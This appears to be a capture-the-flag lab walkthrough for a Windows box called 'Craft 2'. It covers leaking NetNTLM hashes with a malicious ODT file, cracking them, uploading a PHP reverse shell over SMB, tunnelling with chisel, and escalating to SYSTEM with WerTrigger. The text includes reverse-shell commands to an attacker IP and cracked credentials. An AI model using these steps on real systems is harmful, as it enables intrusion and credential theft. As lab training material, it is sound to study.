# Craft 2
## ODT File Upload, Responder, PhpMyAdmin, WerTrigger, BadODT
## Port 80
```
On port 80 there is a website that has a file upload feature accepting ODT files.
It allows only ODT file extensions to be uploaded macros do not work hence Craft2. Nevertheless, there is another exploit available for ODT files on EDB.
 By using this exploit it possible to gather NTLM hash of the user that opens the ODT file. To do so, we first generate a bad ODT file

python2 44564.py
____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \\/ __ \\/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/
/_____/\\__,_/\\__,_/      \\____/_____/_/
Create a malicious ODF document help leak NetNTLM Creds
By Richard Davy 
@rd_pentest
www.secureyourit.co.uk
Please enter IP of listener: 192.168.45.x
```
## Responder / Hashcat
```
Start responder on tun0 interface and upload the file. After a while we get a hit.
responder -I tun0 -v
Decrypting the NTLM hash can be done with hashcat.
[SMB] NTLMv2-SSP Client   : 192.168.230.188
[SMB] NTLMv2-SSP Username : CRAFT2\\thecybergeek
[SMB] NTLMv2-SSP Hash     : thecybergeek::CRAFT2:8f36fb8cf6c71147:3B4BA823C10080345F87867EE3F98F73:01010000000000008023E550C1ACD901BCC138AB1A330FC400000000020008005A0038003600310001001E00570049004E002D005A00470039005A004A004C003500580052004100520004003400570049004E002D005A00470039005A004A004C00350058005200410052002E005A003800360031002E004C004F00430041004C00030014005A003800360031002E004C004F00430041004C00050014005A003800360031002E004C004F00430041004C00070008008023E550C1ACD9010600040002000000080030003000000000000000000000000030000052A5C1E9B4FDE0905ADE5129FBDE979269F1B26EC0B32129BA8F09B6346D35B20A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300037000000000000000000
THECYBERGEEK::CRAFT2:8f36fb8cf6c71147:3B4BA...000:winniethepooh
```
## Enum4Linux
```
The password is “winniethepooh”. Credentials are valid for SMB share. Finding target share:
enum4linux -a -u "CRAFT2\\thecybergeek" -p "winniethepooh" $ip
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WebApp          Disk
```
## smbclient
```
smbclient //$ip/WebApp -U  CRAFT2/thecybergeek

Sending php reverse shell (PHP Ivan Sincek):
smb: \\> put rev.php
putting file rev.php as \\rev.php (30.1 kb/s) (average 24.3 kb/s)

Entering http://192.168.230.188/rev.php and getting reverse shell on our listener:
rlwrap nc -lvnp 445
listening on [any] 445 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.230.188] 49776
```
## PrivEsc MySQL
```
By sending to and running WinPEAS on the remote host, we find that there is MySQL running:
TCP        [::]    3306          [::]      0   Listening    2004      mysqld

Checking C:\xampp\ folder proves that there is MySQL and PHPMyAdmin available on the box.
They cannot be accessed remotely, using chisel we can forward remote port 80 to our local computer and open PHPMyAdmin in kali.
```
## Chisel
```
On kali:
./chisel server -p 8000 --reverse 

On windows:
C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.207:8000 R:8090:localhost:80

Then via your broswer access phpmyadmin at localhost:8090/phpmyadmin/
```
## phpmyadmin
```
By going to SQL section we  can check file write permissions of this MySQL client.
To check this, upload a netcat.exe file via smbclient to the same folder (C:\xampp\htdocs) under another name, we can do this via sql syntax:
SELECT LOAD_FILE('C:\\xamp\\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';

We can see this file has root privileges:

PS C:\\xampp\\htdocs> icacls nc.exe
nc.exe CRAFT2\\apache:(I)(F)
       NT AUTHORITY\\SYSTEM:(I)(F)
       BUILTIN\\Administrators:(I)(F)
       BUILTIN\\Users:(I)(RX)
Successfully processed 1 files; Failed processing 0 files
```
## WerTrigger
```
Exploit for xampp root access:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger
First, clone git repo:
gc <https://github.com/sailay1996/WerTrigger.git>

Then, copy required files to working directory and put them to remote host via smb:

On kali:
cp  WerTrigger/bin/* ./

On smbclient:
smb: \\> put phoneinfo.dll
smb: \\> put Report.wer
smb: \\> put WerTrigger.exe

copy required files to required folders
Execute WerTrigger.exe and put a reverse shell command via netcat

PS C:\\xampp\\htdocs> ./WerTrigger.exe
C:\\xampp\\htdocs\\ncat.exe 192.168.45.207 445 -e cmd

And we get a hit on our listener:
rlwrap nc -lvnp 445
connect to [192.168.45.207] from (UNKNOWN) [192.168.230.188] 49706
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32>whoami
whoami
nt authority\\system
```





